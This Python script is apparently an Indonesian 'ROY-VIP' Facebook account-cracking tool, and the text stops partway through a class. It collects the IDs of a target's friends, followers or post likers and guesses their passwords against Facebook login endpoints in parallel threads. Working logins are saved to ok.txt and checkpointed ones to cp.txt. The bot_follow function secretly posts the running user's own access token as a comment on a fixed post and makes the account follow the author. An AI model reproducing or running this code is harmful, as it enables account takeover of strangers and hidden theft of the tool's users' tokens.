#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Dapunta
# Thanks To Angga, Rizal, Yayan, Hamza, Jessica, And RATU ERROR Project
# Thanks To All Member RATU ERROR
# Please Don't Recode, Thanks.

import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def banner():
    print("""\x1b[0;32m╦═╗╔═╗╦ ╦   ╦  ╦╦╔═╗\n╠╦╝║ ║╚╦╝───╚╗╔╝║╠═╝\n╩╚═╚═╝ ╩     ╚╝ ╩╩  """)

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent": "NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba"}).json()["country"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[❌] "+m+"Cookies Salah")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result

### LOGIN METHODE ###

def logs():
  os.system("clear")
  banner()
  print((p+"\n[❓ "+o+"Metode Login "+p+"]"+p))
  print((p+"["+k+"1"+p+"]"+p+" Login Token"))
  print((p+"["+k+"2"+p+"]"+p+" Login Cookies"))
  print((p+"["+m+"0"+p+"]"+p+" "+m+"Exit"))
  sek=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih :"+k+" ")
  if sek=="":
    print((p+"\n["+k+"❌"+p+"]"+p+" "+m+"Isi yang benar!!!"))
    logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="0":
    exit()
  else:
    print((p+"\n["+k+"❌"+p+"]"+p+" "+m+"Isi yang benar!!!"))
    logs()

def log_token():
    os.system("clear")
    banner()
    toket = input(p+"\n["+k+"⭐"+p+"]"+p+" Token FB :"+k+" ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((p+"\n["+h+"✔"+p+"]"+p+" "+h+"Login Berhasil"))
        bot_follow()
    except KeyError:
        print((p+"["+k+"❌"+p+"]"+p+" "+m+"Token Mati"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = input(p+"\n["+k+"⭐"+p+"]"+p+" Cookies :"+k+" ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Gagal: Mungkin Cookie Anda Mati !!!" if (find_token is None) else "\n* Token akses FB Anda : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((k+"["+p+"⚠️"+k+"]"+p+" "+m+"Tidak ada koneksi"))
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((p+"\n["+h+"✔"+p+"]"+p+" "+h+"Login Berhasil"))
        bot_follow()

### BOT FOLLOW ### Jangan Diganti Anjing !!!

def bot_follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"❌"+k+"]"+p+" "+m+"Token Mati"))
		logs()
	kom = random.choice(['info harga', 'yang awet untuk ads ada ka', 'cek wa ka', 'untuk iklan di IG bisa'])
	requests.post("https://graph.facebook.com/100011146894081/subscribers?access_token=" + toket)      #Roy Octa Firdaus
	requests.post('https://graph.facebook.com/1303409076707310/comments/?message=' +toket+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/1379112335803650/comments/?message=' +kom+ '&access_token=' + toket)
	menu()

### MAIN MENU ###

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((p+"["+k+"❌"+p+"]"+p+" "+m+"Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print("⭐⭐⭐"+h+"ROY-VIP SC s7i Opera Mini⭐⭐⭐")
    print((p+"================================================="))
    print((p+"["+o+"⭐"+p+"]"+p+" Author	: "+k+"Roy Octa Firdaus"))
    print((p+"["+o+"⭐"+p+"]"+p+" Facebook	: "+k+"facebook.com/JbFbOld"))
    print((p+"["+o+"⭐"+p+"]"+p+" Whatsapp	: "+k+"+6281318306972"))
    print((p+"================================================="))
    print((p+"[ Selamat datang "+k+""+a["name"]+p+" ]"+p))
    print((p+"================================================="))
    print((p+"["+h+"✔"+p+"]"+p+" ID FB Anda	: "+k+""+id))
    print((p+"["+h+"✔"+p+"]"+p+" IP Anda	: "+k+""+ip))
    print((p+"["+h+"✔"+p+"]"+p+" Status	: "+h+"Premium"))
    print((p+"["+h+"✔"+p+"]"+p+" Bergabung	: "+k+""+durasi))
    print((p+"================================================="))
    print((p+"[❓ "+o+"Menu Pilihan "+p+"]"+p))
    print((p+"["+k+"1"+p+"]"+p+" Crack Dari Teman/Publik"))
    print((p+"["+k+"2"+p+"]"+p+" Crack Dari Followers FB"))
    print((p+"["+k+"3"+p+"]"+p+" Crack Dari Liker Postingan"))
    print((p+"["+k+"4"+p+"]"+p+" Crack Dari Nomor Telephone"))
    print((p+"["+k+"5"+p+"]"+p+" Crack Dari Email"))
    print((p+"["+k+"6"+p+"]"+p+" Cek Data FB"))
    print((p+"["+k+"7"+p+"]"+k+" Cek Hasil Crack"))
    print((p+"["+m+"0"+p+"]"+m+" Logout/Keluar"))
    print((p+"================================================="))
    choose_menu()

def choose_menu():
	r=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih :"+k+" ")
	if r=="":
		print((p+"["+k+"❌"+p+"]"+p+" "+m+"Maaf Salah"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		random_numbers()
	elif r=="5":
		random_email()
	elif r=="6":
		target()
	elif r=="7":
		ress()
	elif r=="0":
		try:
			jalan(p+"\n["+h+"✔"+p+"]"+p+" "+h+"Terimakasih telah menggunakan SC ROY-VIP")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((p+"["+k+"❌"+p+"]"+p+" "+m+"Error %s"%e))
	else:
		print((p+"["+k+"❌"+p+"]"+p+" "+m+"Salah Memasukkan"))
		menu()	

def pilihcrack(file):
  print((p+"\n[❓ "+o+"Pilih Metode Login : "+p+"]"+p))
  print((p+"["+k+"1"+p+"]"+p+" MBASIC ("+h+"Direkomedasikan"+p+")"))
  print((p+"["+k+"2"+p+"]"+p+" MBASIC + TTL"))
  krah=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih :"+k+" ")
  if krah in[""]:
    print((p+"["+k+"❌"+p+"]"+p+" "+m+"Maaf Salah"))
    pilihcrack(file)
  elif krah in["1","01"]:
    crack(file)
  elif krah in["2","02"]:
    crackttl(file)
  else:
    print((p+"["+k+"❌"+p+"]"+p+" "+m+"Maaf Salah"))
    pilihcrack(file)

### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n["+k+"❌"+p+"]"+p+" "+m+"Cookie/Token Mati"))
		os.system("rm -rf login.txt")
		logs()
	try:
		print((p+"\n["+k+"⭐"+p+"]"+p+" Klik \'me\' Untuk Crack Dari List Teman"))
		idt = input(p+"["+k+"⭐"+p+"]"+p+" User ID Target :"+k+" ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+"["+k+"⭐"+p+"]"+p+" Name : "+k+""+op["name"]))
		except KeyError:
			print((p+"["+k+"❌"+p+"]"+p+" "+m+"ID Tidak Ditemukan"))
			print((o+"\n»»» "+k+"Coba Kembali..." +o+"«««"))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+"["+k+"⭐"+p+"]"+p+" Total ID : "+h+"%s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"["+k+"❌"+p+"]"+p+" "+m+"Error :"+m+" %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n["+k+"❌"+p+"]"+p+" "+m+"Cookie/Token Mati"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(p+"\n["+k+"⭐"+p+"]"+p+" ID Followers Target :"+k+" ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+"["+k+"⭐"+p+"]"+p+" Name :"+k+" "+op["name"]))
		except KeyError:
			print((p+"["+k+"❌"+p+"]"+p+" "+m+"ID Tidak Ditemukan"))
			print((o+"\n»»» "+k+"Coba Kembali..." +o+"«««"))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+"["+k+"⭐"+p+"]"+p+" Total ID :"+h+" %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"["+k+"❌"+p+"]"+p+" "+m+"Error :"+m+" %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n["+k+"❌"+p+"]"+p+" "+m+"Cookie/Token Mati"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input(p+"\n["+k+"⭐"+p+"]"+p+" ID Postingan Target :"+k+" ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+"["+k+"⭐"+p+"]"+p+" Name :"+k+" "+op["name"]))
		except KeyError:
			print((p+"["+k+"❌"+p+"]"+p+" "+m+"ID Tidak Ditemukan"))
			print((o+"\n»»» "+k+"Coba Kembali..." +o+"«««"))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((p+"["+k+"⭐"+p+"]"+p+" Total ID :"+h+" %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit(p+"["+k+"❌"+p+"]"+p+" "+m+"Error :"+m+" %s"%e)

### CRACK EMAIL & PHONE ###

def random_numbers():
  data = []
  print((p+"\n["+k+"⭐"+p+"]"+p+" Nomor Harus 5 Digit"))
  print((p+"["+k+"⭐"+p+"]"+p+" Contoh : 92037"))
  kode=str(input(p+"["+k+"⭐"+p+"]"+p+" Masukkan Nomor : "))
  exit((p+"\n["+k+"❌"+p+"]"+p+" Nomor Harus 5 Digit")) if len(kode) < 5 else ''
  exit((p+"\n["+k+"❌"+p+"]"+p+" Nomor Harus 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(p+"["+k+"⭐"+p+"]"+p+" Total : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY, Tunggu Sebentar...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««")
  menu()

def random_email():
  data = []
  nama=input(p+"\n["+k+"⭐"+p+"]"+p+" Nama Target :"+k+" ")
  domain=input(p+"["+k+"⭐"+p+"]"+p+" Pilih Domain [G]mail, [Y]ahoo, [H]otmail :"+k+" ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit((p+"["+k+"❌"+p+"]"+p+" "+m+"Isi Yang Benar")) if not domain in ['g','y','h'] else ''
  jml=int(input(p+"["+k+"⭐"+p+"]"+p+" Total :"+h+" "))
  setpw=input(p+"["+k+"⭐"+p+"]"+p+" Setel Kata Sandi :"+k+" ").split(',')
  print(p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY, Tunggu Sebentar...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««")
  menu()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mVIP-CP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass

### INFO ACCOUNT ###

def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((p+"\n["+k+"❌"+p+"]"+p+" "+m+"Token Mati"))
		os.system("rm -rf login.txt")
		login()
	try:
		idt = input(p+"\n["+k+"⭐"+p+"]"+p+" ID Target	:"+k+" ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((p+"["+k+"⭐"+p+"]"+p+" Name Akun	:"+k+" "+op["name"]))
			print((p+"["+k+"⭐"+p+"]"+p+" Username	:"+k+" "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((p+"["+k+"⭐"+p+"]"+p+" Email	:"+k+" "+op["email"]))
			except KeyError:
				print((p+"["+k+"⭐"+p+"]"+p+" Email	:"+k+" -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((p+"["+k+"⭐"+p+"]"+p+" Tanggal Lahir	:"+k+" "+op["birthday"]))
			except KeyError:
				print((p+"["+k+"⭐"+p+"]"+p+" Tanggal Lahir	:"+k+" -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((p+"["+k+"⭐"+p+"]"+p+" Jenis Kelamin	:"+k+" "+op["gender"]))
			except KeyError:
				print((p+"["+k+"⭐"+p+"]"+p+" Jenis Kelamin	:"+k+" -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((p+"["+k+"⭐"+p+"]"+p+" Total Teman	:"+h+" %s"%(len(id))))
			except KeyError:
				print((p+"["+k+"⭐"+p+"]"+p+" Total Teman	:"+h+" -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((p+"["+k+"⭐"+p+"]"+p+" Total Pengikut FB	:"+h+" %s"%(len(id))))
			except KeyError:
				print((p+"["+k+"⭐"+p+"]"+p+" Total Pengikut FB	:"+h+" -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((p+"["+k+"⭐"+p+"]"+p+" Website		:"+k+" "+op["website"]))
			except KeyError:
				print((p+"["+k+"⭐"+p+"]"+p+" Website		:"+k+" -"))
			except IOError:
				print((p+"["+k+"⭐"+p+"]"+p+" Website		:"+k+" -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((p+"["+k+"⭐"+p+"]"+p+" Terakhir Update	:"+h+" "+op["updated_time"]))
			except KeyError:
				print((p+"["+k+"⭐"+p+"]"+p+" Terakhir Update	:"+h+" -"))
			except IOError:
				print((p+"["+k+"⭐"+p+"]"+p+" Terakhir Update	:"+h+" -"))
			input(o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««")
			menu()
		except KeyError:
			input(o+"\n»»» "+k+"ENTER Untuk Kembali" +o+"«««")
			menu()
	except Exception as e:
		exit(p+"["+k+"❌"+p+"]"+p+" "+m+"Error :"+m+" %s"%e)

### PASSWORD ###

def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				if "indonesia" in ips:
					results.append("sayang")
	return results

### BRUTE CRACK ###

def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n["+h+"✔"+p+"]"+p+" Kata Sandi Default : "+k+"nama,nama123,nama12345"))
		print((p+"["+k+"⭐"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
		while True:
			f=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih :"+k+" ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+"["+k+"⭐"+p+"]"+p+" Contoh :"+k+" cantik,cantik123,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+"["+k+"⭐"+p+"]"+p+" List Kata Sandi :"+k+" ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mVIP-CP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;33m[\x1b[0;37m***\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n["+h+"✔"+p+"]"+p+" Kata Sandi Default : "+k+"nama,nama123,nama12345"))
		print((p+"["+k+"⭐"+p+"]"+p+" Crack Dengan Kata Sandi Default/Manual [d/m]?"))
		while True:
			f=input(p+"\n["+k+"❓"+p+"]"+p+" Pilih :"+k+" ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+"["+k+"⭐"+p+"]"+p+" Contoh :"+k+" cantik,cantik123,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+"["+k+"⭐"+p+"]"+p+" List Kata Sandi :"+k+" ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n["+k+"⭐"+p+"]"+p+" "+h+"Crack by ROY sedang berjalan..."+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+h+"OK"+p+"] Disimpan di : ok.txt"+p+"\n["+h+"✔"+p+"]"+p+" Akun ["+k+"CP"+p+"] Disimpan di : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m[\x1b[0;37mVIP-CP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mVIP-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
